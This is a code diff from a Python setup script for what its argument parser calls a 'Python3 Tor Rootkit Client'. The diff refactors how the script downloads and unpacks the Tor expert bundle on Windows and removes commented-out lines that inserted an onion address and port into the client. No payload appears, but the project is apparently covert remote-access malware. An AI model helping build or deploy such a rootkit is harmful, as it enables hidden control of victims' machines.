@@ -12,13 +12,13 @@ def get_tor_expert_bundle():
     os.chdir('torbundle')
 
     # download tor expert bundle
-    torURL = 'https://www.torproject.org/dist/torbrowser/10.5.6/tor-win32-0.4.5.10.zip'
-    fileData = requests.get(torURL, allow_redirects=True)
+    tor_url = 'https://www.torproject.org/dist/torbrowser/10.5.6/tor-win32-0.4.5.10.zip'
+    file_data = requests.get(tor_url, allow_redirects=True)
 
     # write downloaded tor expert bundle
     try:
         file = open('tor.zip', 'wb')
-        file.write(fileData.content)
+        file.write(file_data.content)
     except Exception as error:
         print('[-] Error while writing tor expert bundle: {}'.format(error))
         sys.exit(1)
@@ -26,17 +26,13 @@ def get_tor_expert_bundle():
         print('[*] Wrote tor expert bundle to file')
 
     # unzip tor expert bundle
-    try:
-        file = zipfile.ZipFile('tor.zip')
-        file.extractall('.')
-    except Exception as error:
-        print("[-] Error while unpacking tor library: {}".format('error'))
-        sys.exit(1)
-    else:
-        print("[*] Unpacked Tor expert bundle")
+    file = zipfile.ZipFile('tor.zip')
+    file.extractall('.')
+    print("[*] Unpacked Tor expert bundle")
 
     # change directory back to \client
     os.chdir('..')
+
 
 def parse_args():
     parser = ArgumentParser(description='Python3 Tor Rootkit Client')
@@ -47,16 +43,6 @@ def parse_args():
 
 
 if __name__ == '__main__':
-    #onion, port = parse_args()
-    # replace the onion and port line in client.py,
-    # since if havent found a more elegant way to do this yet.
-    #lines = open('client.py').read().splitlines()
-    # onion address is defined in line 6
-    #lines[5] = 'onion = "{}"'.format(onion)
-    # onion port is defined in line 7
-    #lines[6] = 'port = {}'.format(port)
-    # write modified script to file
-    #open('client.py','w').write('\n'.join(lines))
     # dont download everytime
     if not os.path.isdir('torbundle') and os.name == 'nt':
         get_tor_expert_bundle()
